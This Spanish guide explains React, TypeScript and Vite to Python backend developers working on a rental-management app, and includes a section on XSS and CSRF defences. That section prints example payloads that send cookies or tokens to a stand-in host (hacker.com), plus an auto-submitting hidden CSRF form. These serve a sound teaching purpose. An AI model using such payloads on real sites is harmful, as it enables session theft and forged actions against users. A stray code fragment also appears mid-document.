# 🖥️ Guía de Frontend para Desarrolladores Backend (Pythonistas)

Si vienes del mundo de Python, FastAPI y servidores backend, el frontend moderna (React, TypeScript, Vite) puede parecer al principio una caja negra llena de magia y acrónimos raros. 

Este documento está diseñado específicamente para **traducir los conceptos del desarrollo frontend a analogías del mundo backend**, explicándote exactamente cómo funciona nuestra aplicación por debajo, por qué usamos las tecnologías que usamos, y cómo se relaciona todo esto con la seguridad y la arquitectura de nuestro proyecto.

---

## 1. El Gran Cambio de Paradigma: De Renderizado Servidor a SPA

Para entender por qué el código frontend moderna es como es, primero debemos entender **qué es exactamente "renderizar"** y cómo ha cambiado la forma en que los servidores se comunican con los navegadores.

La palabra **Renderizar (Rendering)** en desarrollo web significa simplemente: **"Convertir datos en bruto de una base de datos en código visual HTML y CSS listo para que un monitor lo dibuje en la pantalla"**.

Históricamente, había una sola forma de hacer esto, pero en la última década la industria migró a un modelo totalmente distinto. Veamos la diferencia desde cero:

---

### 1.1 El Modelo Tradicional: Renderizado en el Servidor (SSR / Aplicación Multi-Página)

Así funcionaba la web históricamente (y así siguen funcionando sistemas como WordPress, Django con plantillas Jinja, o PHP):

1. **El usuario hace clic en un enlace** (por ejemplo, "Ver Propiedad #1").
2. **El navegador se queda en blanco por una fracción de segundo** y envía una petición HTTP al servidor backend: `GET /properties/1`.
3. **El servidor Python hace todo el trabajo visual:** Se conecta a la base de datos SQLite, obtiene la propiedad y luego toma un archivo de plantilla HTML (`<h1>{{ property.name }}</h1>`). En el propio servidor, el código Python **recorta, pega y ensambla una cadena de texto gigante con todo el HTML completo** de la página.
4. El servidor envía por internet esos 50 KB de texto HTML por cable hasta el ordenador del usuario.
5. El navegador recibe el HTML estático, borra la pantalla anterior por completo y dibuja la nueva página desde cero.

```
[NAVEGADOR WEB]                                   [SERVIDOR PYTHON / DJANGO]
  1. Clic en "Ver Propiedad" ─────────────────────▶ 2. Consulta SQLite
                                                       3. Construye texto HTML completo
  5. Borra pantalla y dibuja HTML ◀──(HTML Completo)─── 4. Envía 50 KB de HTML
```

**❌ El Problema de este modelo:**
*   **Es lento y tosco:** Cada vez que haces clic en cualquier botón o pestaña, toda la pantalla parpadea en blanco y se vuelve a recargar desde cero.
*   **Desperdicia CPU del servidor:** Tu servidor Python gasta un tiempo precioso procesando etiquetas HTML (`<div>`, `<span>`, colores) en lugar de dedicarse a la lógica de negocio pura y al cálculo de datos.
*   **Desperdicia ancho de banda:** Si cambias de la página 1 a la página 2 del catálogo, la cabecera, el menú lateral y el pie de página son idénticos, pero el servidor te los vuelve a enviar descargados repetidamente por la red.

---

### 1.2 El Modelo Moderno: SPA (Single Page Application / Aplicación de Página Única)

Para solucionar la lentitud del modelo anterior, nació el concepto de **SPA (Single Page Application)**. Es el estándar actual de la industria para aplicaciones web interactivas (Gmail, Netflix, Spotify, y nuestra app de Gestión de Alquileres).

Su nombre lo dice todo: **Tu sitio web tiene un ÚNICO archivo HTML (`index.html`) que está prácticamente vacío y la página NUNCA jamás se recarga**.

¿Cómo funciona entonces si no hay páginas HTML nuevas en el servidor? Quien hace el trabajo visual ya no es Python, **es el propio navegador del usuario usando JavaScript**:

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│ FASE 1: EL ATERRIZAJE (Solo ocurre 1 vez cuando abres la web por primera vez)    │
│                                                                                  │
│ [NAVEGADOR] ──(GET /)──▶ [SERVIDOR FRONTEND]                                     │
│ [NAVEGADOR] ◀──(Devuelve index.html vacío + programa JS "bundle.js")─────────────│
│                                                                                  │
│ * El navegador descarga nuestro programa React en su memoria RAM.                │
│ * A partir de este segundo, la web funciona como una app nativa de escritorio.   │
└──────────────────────────────────────────────────────────────────────────────────┘
```

Una vez que el navegador tiene el programa JavaScript cargado en memoria, el día a día al navegar es radicalmente distinto:

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│ FASE 2: LA INTERACCIÓN DIARIA (Ultra rápido, sin parpadeos, sin recargar HTML)    │
│                                                                                  │
│ [USUARIO] Hace clic en "Ver Propiedad #1"                                        │
│     │                                                                            │
│     ▼                                                                            │
│ [JAVASCRIPT EN EL NAVEGADOR (React)]                                             │
│  1. Borra instantáneamente la lista de la pantalla (sin recargar la pestaña).    │
│  2. Dibuja el esqueleto visual de la tarjeta (el hueco para el título y precio). │
│  3. Envía una petición HTTP silenciosa "en segundo plano" a FastAPI:             │
│     GET /api/properties/1                                                        │
│     │                                                                            │
│     ▼                                                                            │
│ [SERVIDOR PYTHON (FastAPI)]                                                      │
│  * Ya NO sabe ni le importa nada de HTML, colores o diseño visual.               │
│  * Solo consulta SQLite y devuelve los DATOS PUROS en formato JSON:              │
│    {"id": "1", "name": "Piso Centro", "price": 800}                              │
│     │                                                                            │
│     ▼                                                                            │
│ [JAVASCRIPT EN EL NAVEGADOR (React)]                                             │
│  4. Recibe el JSON y rellena los huecos de la pantalla en medio milisegundo.     │
└──────────────────────────────────────────────────────────────────────────────────┘
```

---

### 1.3 La Analogía Definitiva: El Libro Impreso vs. La Pizarra Inteligente

*   **Renderizado en Servidor (MPA / Tradicional):** Es como leer una novela en un formato donde **cada vez que quieres pasar a la página siguiente, tienes que tirar el libro entero a la basura** y esperar a que el cartero te traiga a casa un libro nuevo impreso por la imprenta con la nueva página abierta.
*   **SPA (Single Page Application / Moderno):** Es como tener una **pizarra digital electrónica en tu mesa** y un asistente inteligente (JavaScript). Cuando pides ver la página siguiente, el asistente simplemente borra con un trapo la mitad inferior de la pizarra y escribe las nuevas líneas en medio segundo, sin cambiar de pizarra y sin llamar a la imprenta.

---

### 1.4 ¿Por qué esto cambia tu mentalidad como programador Python?

Este cambio de paradigma explica por qué nuestro proyecto está dividido en dos carpetas separadas (`backend/` y `frontend/`):

1. **Frontera de Hormigón:** En el modelo antiguo, tú como programador backend mezclabas código Python con etiquetas HTML (`<div class="{{ color }}">`). En nuestro modelo SPA, **tu backend FastAPI es 100% agnóstico a la interfaz**. Es una API REST pura que habla el idioma universal **JSON**. Podríamos borrar la carpeta `frontend/` y crear una app móvil para iOS/Android o una app de consola, y el backend Python **no cambiaría ni una sola línea de código**.
2. **El Frontend es un Software Independiente:** El frontend ya no es una simple "plantilla bonita"; es una aplicación de software con su propia arquitectura, su gestión de memoria RAM, su enrutador de pantallas y sus propios contratos de datos (TypeScript), que corre íntegramente dentro del procesador (CPU) de tu usuario.

---

## 2. El Stack Tecnológico Explicado para Pythonistas

### 2.1 El DOM (Document Object Model) y JavaScript
El navegador web lee un archivo HTML y lo convierte en memoria en un **árbol de objetos llamado DOM** (parecido a un diccionario de diccionarios o un árbol JSON gigante en Python). 
- **JavaScript** es el único lenguaje de programación que los navegadores web (Chrome, Firefox, Safari) saben ejecutar de forma nativa. Su trabajo principal es modificar ese árbol DOM en tiempo real (añadir un botón, cambiar un color, borrar una caja) sin recargar la página.

### 2.2 TypeScript = JavaScript + Type Hints estrictos
Si programas en Python moderno con *Type Hints*:
```python
# Python moderno
def calculate_total(price: float, quantity: int) -> float:
    return price * quantity
```
Sabes que Python es dinámico pero los tipos te ayudan a no cometer errores en el IDE (con herramientas como `mypy`). 

**TypeScript** es exactamente eso llevado al extremo para JavaScript:
```typescript
// TypeScript en nuestro frontend
function calculateTotal(price: number, quantity: number): number {
    return price * quantity;
}
```
Los navegadores **no entienden TypeScript directamente**. Por eso usamos una herramienta de construcción (en nuestro caso **Vite**) que compila y traduce nuestro código TypeScript (`.ts`/`.tsx`) a JavaScript estándar (`.js`) ultra optimizado antes de enviárselo al navegador.

### 2.4 ¿Dónde está cada cosa? (El misterio de `.tsx`, React, JS, HTML y el DOM)

Es muy normal que esta mezcla de términos confunda al principio. Veamos exactamente qué es y dónde vive cada uno:

#### 1. ¿Qué es `.tsx`? ¿Es un lenguaje estandarizado?
El lenguaje de programación como tal se llama **TypeScript** (creado por Microsoft).
La extensión `.tsx` es la extensión oficial que se usa cuando escribes **TypeScript** y dentro de él incluyes sintaxis de plantillas visuales **JSX** (código que parece HTML dentro del propio código, como `return <button>Guardar</button>`).
Como has deducido correctamente: **TypeScript (.tsx) necesita ser compilado/traducido a JavaScript (.js) para ejecutarse en el navegador, y Node.js es quien ejecuta la herramienta de compilación (Vite).**

#### 2. ¿Dónde está JavaScript?
TypeScript **ES** JavaScript, pero con superpoderes de comprobación de tipos. Sin embargo, los navegadores (Chrome, Firefox) no saben leer `.tsx` ni `.ts`. 
Cuando ejecutas `npm run dev` o `npm run build`, la herramienta **Vite** compila y traduce automáticamente todos nuestros archivos `.tsx` a un único archivo `.js` de JavaScript puro y ligero. **Ese JavaScript traducido es lo que realmente se descarga y ejecuta en el navegador.**

#### 3. ¿Dónde está React?
React no es un lenguaje, es una **librería externa** instalada vía `npm` (igual que cuando instalas `pytest` o `fastapi` con `pip` en Python). 
Vive instalada dentro de la carpeta `node_modules/react`. En nuestros archivos `.tsx`, la usas cada vez que importas funciones como `import { useState } from 'react'` o cuando defines un componente funcional.

#### 4. ¿Dónde está el HTML?
En toda la carpeta `frontend/`, **solo existe UN archivo HTML real en el disco duro**: [frontend/index.html](file:///home/carlos/rental-handler/frontend/index.html).
Si lo abres, verás que está casi vacío. Solo tiene una caja vacía `<div id="root"></div>` y una línea que carga nuestro archivo de JavaScript:
```html
<script type="module" src="/src/main.tsx"></script>
```
Las etiquetas `<div>`, `<h1>` o `<button>` que ves dentro de las páginas `.tsx` **no son HTML estático**, son código **JSX**. Son instrucciones en JavaScript que le dicen a React: *"Crea estas etiquetas en la pantalla cuando el usuario entre aquí"*.

#### 5. ¿Dónde está el DOM?
El **DOM (Document Object Model)** **NO es un archivo que puedas abrir en tu editor de código**. 
El DOM es un **árbol de objetos que vive en la memoria RAM del navegador web** mientras la página está abierta. Cuando Chrome descarga el archivo JavaScript generado por React, ejecuta ese código y **va construyendo y modificando el árbol del DOM en la RAM** para pintar los botones, tablas y fotos en la pantalla.

#### 6. ¿Y qué pinta Node.js aquí? ¿Lo usamos?
**¡Sí, pero SOLO durante el desarrollo y la compilación!**
- **¿Qué es Node.js?** Para un desarrollador Python: Node.js es a JavaScript lo que el ejecutable `python3` es a Python. Históricamente, JavaScript solo se podía ejecutar dentro del navegador web (Chrome). Node.js extrajo el motor de JavaScript de Chrome para poder **ejecutar programas JavaScript fuera del navegador, directamente en la consola de tu ordenador** (`node script.js` exactamente igual que `python script.py`).
- **¿Para qué lo usamos en nuestro proyecto?**
  1. **`npm` (Node Package Manager):** Es el gestor de paquetes de Node.js (el equivalente exacto de `pip` en Python). Lo usamos para descargar librerías como React o Vite (`npm install`).
  2. **Vite (La herramienta de build):** Vite es un programa escrito en JavaScript/TypeScript que se ejecuta en tu terminal sobre **Node.js**. Cuando escribes `npm run dev` o `npm run build`, Node.js ejecuta Vite para traducir tus archivos `.tsx` a JavaScript plano `.js`.
- **¿Usamos Node.js en Producción?** **NO.** Una vez compilada la app (`npm run build`), Node.js ya no hace falta en el servidor. Lo que se obtiene son archivos estáticos estandarizados (`index.html`, `index.js`, `index.css`) que cualquier servidor (como Nginx o tu propio FastAPI con `StaticFiles`) puede entregar al usuario. Y cuando el usuario abre la web, ese JavaScript lo ejecuta el **navegador del usuario (Chrome)**, no Node.js.

---

### Resumen del Mapa Mental:

```
    DESARROLLO EN TU TERMINAL (Usa Node.js + npm + Vite)
    ├── npm        ──▶ Equivalente a 'pip' (Descarga React y librerías)
    └── Vite       ──▶ Programa ejecutable en Node.js que compila tus .tsx a .js
             │
             ▼ (Genera los archivos finales en /dist)
    CÓDIGO PRODUCIDO (Archivos estáticos)
    ├── index.html ──▶ Único archivo HTML real (vacío, solo sirve de contenedor)
    └── app.js     ──▶ JavaScript puro generado por Vite
             │
             ▼ (Cualquier servidor HTTP los entrega por internet: FastAPI, Nginx, CDN...)
    EN LA MEMORIA RAM DEL NAVEGADOR DEL USUARIO (No requiere Node.js)
    └── El DOM     ──▶ Árbol vivo en la RAM de Chrome que dibuja los píxeles
```
    title: string;
    price: number;
}

export function PropertyCard({ title, price }: PropertyCardProps) {
    return (
        <div className="card">
            <h3>{title}</h3>
            <p>{price} € / mes</p>
        </div>
    );
}
```

---

## 3. Conceptos Clave de React Traducidos a Conceptos Backend

Para leer el código en `frontend/src/`, necesitas entender 3 conceptos fundamentales que usamos constantemente:

### 3.1 Estado (`useState`) ~ "Variables Reactivas"
En Python normal, si haces:
```python
x = 10
# Si luego haces x = 20, la pantalla mágica no se actualiza sola.
```
En React, para que cuando un dato cambie (ej: llega la respuesta del backend con el beneficio neto) la pantalla se redibuje sola al instante, usamos una herramienta llamada `useState`:

```tsx
// Declaramos una variable 'count' y su función para cambiarla 'setCount'
const [count, setCount] = useState<number>(0);

// Cuando llamemos a setCount(5), React detecta el cambio y redibuja la UI automáticamente.
```

### 3.2 Efectos (`useEffect`) ~ "Hooks de Ciclo de Vida / Eventos al Arrancar"
¿Cómo hacemos que apenas el usuario abra la página de Detalle de Propiedad, el frontend llame automáticamente a FastAPI para descargar los gastos e ingresos? Con un `useEffect`:

```tsx
useEffect(() => {
    // Esto se ejecuta automáticamente cuando el componente "nace" en la pantalla
    api.getProperty(id).then(data => setProperty(data));
}, [id]); // Solo se vuelve a ejecutar si el 'id' cambia
```
**Analogía:** Es idéntico a los eventos `@app.on_event("startup")` o al `lifespan` de FastAPI, pero a nivel de una pantalla visual.

### 3.3 Contexto (`useContext` y nuestro `AuthProvider`) ~ "Inyección de Dependencias / Variables Globales seguras"
Imagina que el usuario ha iniciado sesión. Tienes una variable `user`. ¿Cómo haces para que la página de Perfil, la Barra Superior y el Botón de Logout sepan quién es el usuario sin tener que pasar esa variable como parámetro (`user={user}`) por 20 componentes intermedios?

Para eso se usa el **Contexto (Context)**. Es similar a la **Inyección de Dependencias en FastAPI (`Depends(get_current_user)`)** o al objeto `app.state`. 
En nuestro proyecto, creamos el `AuthProvider.tsx`. Envuelve toda la aplicación y permite que cualquier componente, esté donde esté, pueda hacer:
```tsx
const { user, isAuthenticated, logout } = useAuth();
```
Y tenga acceso instantáneo a la sesión.

---

## 4. Anatomía de Nuestro Proyecto Frontend (`frontend/src/`)

Así está estructurada nuestra arquitectura en el lado del cliente, pensada para ser un reflejo limpio de nuestra arquitectura backend:

```
frontend/src/
├── main.tsx          # 🚀 El Punto de Entrada (Como el if __name__ == '__main__': o el arranque de Uvicorn)
├── App.tsx           # 🗺️ El Enrutador principal (Como el app.include_router de FastAPI). Define qué pantalla ver según la URL (/properties, /login).
├── types/            # 📐 Contratos y Modelos de Datos (Los equivalentes exactos a tus Pydantic Schemas de backend).
├── services/         # 🔌 Capa HTTP / Adaptadores (Donde usamos fetch() para hablar con FastAPI. Alimenta al resto de la app).
│   ├── api.ts        #    Peticiones de propiedades, gastos e ingresos.
│   └── auth.ts       #    Peticiones de login, registro, refresco y manejo de tokens en memoria.
├── components/       # 🧱 Bloques LEGO reutilizables (Tarjetas, Botones, Modales, Toast, AuthProvider).
└── pages/            # 🖥️ Pantallas Completas (Controladores de Vista: PropertyList, PropertyDetail, Login, Register).
```

---

## 5. Seguridad Frontend para Backend Devs: ¿Qué es XSS y por qué le importa a un Pythonista?

Cuando leíste sobre la autenticación en `docs/authentication.md`, apareció el concepto de **XSS (Cross-Site Scripting)** y la prohibición de usar `localStorage`. Ahora que entiendes cómo funciona el navegador, veamos por qué esto es tan crítico:

### ¿Qué es un ataque XSS?
Imagina que tienes un endpoint en tu backend Python que permite crear una propiedad: `POST /api/properties`. Un atacante malicioso se registra y crea una propiedad con este nombre de calle:
```html
<img src="x" onerror="fetch('http://hacker-server.com/steal?cookie=' + document.cookie)">
```
o inyectando un script directamente si no se valida:
```html
<script>
  // Script malicioso inyectado por un tercero
  const token = localStorage.getItem('token');
  fetch('http://hacker.com/steal?token=' + token);
</script>
```

Si el frontend fuera inyectar texto crudo al DOM sin limpiar, el navegador vería esa etiqueta `<script>` o ese evento `onerror` y **lo ejecutaría como si fuera código legítimo programado por nosotros**.

### ¿Por qué `localStorage` es una trampa mortal en autenticación?
`localStorage` es un almacén de datos del navegador en el disco duro del usuario. Tiene una propiedad peligrosa: **Cualquier código JavaScript que se esté ejecutando en la página web tiene acceso de lectura total a `localStorage` simplemente llamando a `localStorage.getItem(...)`**.

Si almacenas tu Token JWT (la llave maestra del usuario) en `localStorage` y tu web sufre una vulnerabilidad XSS (incluso por culpa de una librería de terceros defectuosa que hayas instalado con `npm`), **el script malicioso robará el token en 1 milisegundo y lo enviará al servidor del hacker**. Con ese token, el hacker llamará a tu backend Python desde su casa haciéndose pasar por tu usuario.

### ¿Cómo nos protege nuestra arquitectura "Shielded JWT"?
Aquí cobra todo el sentido la arquitectura que implementamos en **F-06**:
1. **El Refresh Token (de larga duración, 7 días):** Lo enviamos desde FastAPI en una **Cookie con la bandera `HttpOnly`**. Cuando el navegador ve la bandera `HttpOnly`, activa un escudo de protección en el kernel del navegador: **Le prohíbe terminantemente al motor de JavaScript leer esa cookie**. Aunque un hacker logre inyectar el peor virus XSS imaginable en nuestro React, si intenta hacer `document.cookie`, el Refresh Token no aparecerá. Es físicamente invisible para JavaScript.
2. **El Access Token (de corta duración, 15 min):** Necesitamos leerlo en JavaScript para ponerlo en la cabecera `Authorization: Bearer <token>` cuando llamamos a FastAPI. Pero en lugar de guardarlo en el disco duro (`localStorage`), lo guardamos **únicamente en una variable en memoria RAM** dentro del archivo `auth.ts` (`let accessToken: string | null = null;`). 
   - Gracias al encapsulamiento de módulos de JavaScript, un script malicioso externo no tiene forma fácil de acceder al espacio de memoria privado de esa variable. Y si recargan o cierran la pestaña, la memoria se borra.

### ¿Y qué pasa con CSRF (Cross-Site Request Forgery)? El segundo escudo de nuestro login

Mientras que **XSS** es *"Inyectar código malicioso dentro de TU propia web"*, **CSRF** es *"Un sitio web malicioso de TERCEROS engañando al navegador del usuario para que ejecute acciones en tu backend sin que se dé cuenta"*.

#### ¿Cómo ocurre un ataque CSRF tradicional?
Imagina que un usuario tiene sesión abierta en tu aplicación usando una cookie tradicional de sesión.
1. El usuario abre una pestaña nueva y navega a una web tramposa: `www.web-pirata-hacker.com`.
2. En esa web pirata, el atacante ha puesto un formulario invisible:
   `<form action="http://localhost:8000/api/properties" method="POST">...`
   y un script que envía el formulario automáticamente al cargar la página.
3. El navegador de la víctima ve que la petición va dirigida a `http://localhost:8000` y piensa: *"¡Ah! Tengo guardada una cookie de sesión para localhost:8000, así que la adjunto automáticamente a la petición"*.
4. Tu backend Python recibe la petición, ve la cookie de sesión válida y crea o borra una propiedad creyendo que el usuario quería hacerlo.

#### ¿Cómo destruye este ataque nuestra arquitectura de Doble Token (F-06)?
Nuestra arquitectura de **Shielded JWT** anula por completo el ataque CSRF mediante 3 barreras de seguridad combinadas:

1. **Peticiones de Datos exigen Cabecera HTTP (No Cookies):**
   Para cualquier acción (crear propiedad, añadir ingresos, registrar gastos), FastAPI no busca una cookie de sesión; exige la cabecera de autorización: `Authorization: Bearer <access_token>`. Un sitio web de terceros como `web-pirata-hacker.com` **NO puede inyectar cabeceras HTTP personalizadas en peticiones cruzadas automáticas** (el navegador bloquea las cabeceras personalizadas mediante la política de seguridad CORS).
2. **`SameSite=Lax` en la Cookie del Refresh Token:**
   La única cookie que usa nuestro sistema es el `refresh_token`. Al emitirla con la propiedad `SameSite=Lax`, los navegadores modernos **prohíben enviar esa cookie cuando la petición proviene de un sitio web externo o de un formulario cruzado**.
3. **Restricción estricta de Ruta (`Path=/api/auth`):**
   La cookie del Refresh Token se emite con la propiedad `Path=/api/auth`. Esto le indica al navegador que **SOLO adjunte esa cookie cuando se llame a endpoints que empiecen por `/api/auth`** (como `/api/auth/refresh`). Si una web maliciosa intenta llamar a `/api/properties` o a cualquier otra ruta de datos, el navegador ni siquiera incluye la cookie en el paquete.


## 5.1 bonus

### ¿Cómo podrían XSS y CSRF realmente afectarnos si no nos protegemos bien?

### Ejemplo XSS: Paneles de Administración (El objetivo nº 1 de un hacker)

  Imagina una web donde los datos son privados y cada usuario solo ve sus propias cosas (como nuestra app de alquileres).

  1. El Hacker se registra como un usuario normal y crea una propiedad con este nombre de calle:
    <script>fetch('http://hacker.com/steal?admin_session=' + document.cookie)</script>

  2. El hacker abre un ticket de soporte diciendo: "Tengo un problema con la dirección de mi propiedad, por favor revisadla".
  3. El Administrador del sistema (un empleado con permisos totales sobre la base de datos) entra a su panel interno /admin/properties a revisar la propiedad del hacker.
  4. El navegador del administrador renderiza la calle de la propiedad ➔ El código JavaScript se ejecuta dentro de la sesión del ADMINISTRADOR.
  5. El script le roba el token de administrador al empleado y se lo envía al hacker.
  6. Resultado: El hacker ahora tiene el control total de la base de datos entera de todos los usuarios del sistema.

 ### Ejemplo CSRF: Ejecutar acciones en tu nombre sin tu permiso

  1. Estás logueado en tu plataforma de alquileres (http://tu-app-alquileres.com).
  2. En otra pestaña, abres una web maliciosa o haces clic en un enlace tramposo (http://web-pirata.com).
  3. En esa web pirata, el hacker ha puesto este código invisible:
    <!-- Formulario oculto que se envía automáticamente al cargar la página -->
    <form action="http://tu-app-alquileres.com/api/properties/1" method="POST">
      <input type="hidden" name="action" value="DELETE">
    </form>
    <script>document.forms[0].submit();</script>
**Esto llega al backend de la aplicación aunque venga de otro dominio y no esté en el CORS del backend porque SOP no bloquea html básico en escritura (lo que si bloquearía seriá la respuesta si es que hace un get, pero aquí ya me habrían borrado la base de datos)**

  4. Al entrar a la web pirata, tu navegador envía automáticamente ese formulario hacia http://tu-app-alquileres.com.
  5. La trampa del navegador: Como la petición va dirigida a tu-app-alquileres.com, el navegador dice: "¡Ah! Tengo guardada la cookie de sesión del usuario para esta web,
  así que la adjunto automáticamente en el paquete HTTP".
  6. Tu backend Python recibe la petición, ve tu cookie de sesión válida y borra tu propiedad creyendo que fuiste tú quien hizo clic.


---

## 6. El Viaje de un Clic: Cómo se comunican Frontend y Backend en la Práctica

Para terminar de unir los dos mundos, sigamos el viaje exacto de lo que ocurre cuando un usuario hace clic en el botón **"Iniciar Sesión"**:

```
[USUARIO] (Hace clic en "Iniciar Sesión" en la pantalla Login.tsx de React)
    │
    ▼
[FRONTEND - Login.tsx] 
    Llama a la función del contexto: `auth.login({ email, password })`
    │
    ▼
[FRONTEND - services/auth.ts] 
    Ejecuta una petición HTTP asíncrona hacia el servidor Python:
    fetch("http://localhost:8000/api/auth/login", { 
        method: "POST",
        body: JSON.stringify({ email: "...", password: "..." }),
        credentials: "include"  // ⚠️ Vital para que el navegador acepte y guarde cookies del servidor
    })
    │
    ▼
[RED / NAVEGADOR - Intervención de CORS]
    El navegador comprueba las cabeceras de tu backend FastAPI. 
    Como en `main.py` configuramos `allow_origins=["http://localhost:5173"]` y `allow_credentials=True`, 
    el navegador le da luz verde a la petición.
    │
    ▼
[BACKEND - FastAPI / SQLite]
    1. Recibe el DTO `UserLoginRequest` en `routes/auth.py`.
    2. El Caso de Uso `LoginUserUseCase` consulta SQLite y verifica el hash BCrypt.
    3. El Adaptador `JWTTokenService` firma dos tokens (Access y Refresh).
    4. Responde HTTP 200 OK devolviendo el Access Token en el JSON y el Refresh Token en la cabecera `Set-Cookie`.
    │
    ▼
[FRONTEND - Recepción y Estado]
    1. El navegador intercepta la cabecera `Set-Cookie` y guarda la cookie `HttpOnly` en su bóveda secreta.
    2. `services/auth.ts` toma el JSON de respuesta y guarda `accessToken` en su variable en memoria RAM.
    3. `AuthProvider.tsx` actualiza el estado `user` mediante `setUser(...)`.
    4. React detecta que el estado global cambió y redibuja la pantalla instantáneamente, llevando al usuario al catálogo principal (`/`), ya autenticado y con sus datos cargados.
```

---

## 7. Resumen de Conceptos: Diccionario Backend ↔ Frontend

| Concepto Backend (Python / FastAPI) | Concepto Equivalente en Frontend (React / Vite) |
| :--- | :--- |
| `uvicorn main:app --reload` | `npm run dev` (Vite dev server con Hot Module Replacement) |
| `pip install <paquete>` / `requirements.txt` | `npm install <paquete>` / `package.json` |
| `def endpoint(req: Schema):` (Función procesadora) | `function Component(props: Props): JSX.Element` |
| Pydantic Schemas (`BaseModel`) | TypeScript Interfaces (`interface UserResponse { ... }`) |
| `app.include_router(...)` (Enrutamiento HTTP) | `<Routes><Route path="..." /></Routes>` (React Router) |
| `@app.on_event("startup")` / `lifespan` | `useEffect(() => { ... }, [])` |
| `Depends(get_current_user)` (Inyección / Estado global)| `useContext(AuthContext)` / `useAuth()` |
| `app.state.db` / Variables globales en memoria | `useState(...)` / Variables en memoria en `services/*.ts` |
